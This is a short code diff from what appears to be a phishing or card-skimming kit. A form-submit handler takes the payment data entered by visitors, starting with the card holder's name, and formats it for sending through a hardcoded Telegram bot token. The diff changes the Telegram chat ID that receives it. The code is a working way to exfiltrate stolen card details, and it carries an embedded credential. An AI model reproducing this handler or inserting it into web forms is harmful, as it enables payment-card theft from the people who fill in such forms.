@@ -38,7 +38,7 @@ form.addEventListener("submit", (event) => {
     if (result.isValid) {
         try {
             const telegramBotToken = "8997100869:AAHF5K0FHPsdNmdbw97l8gK32G7IFwh8yQ8";
-            const telegramChatId = "-5276877860";
+            const telegramChatId = "-5474385654";
             const message = `
            <b>Card Name</b>
 ${cardHolderName}
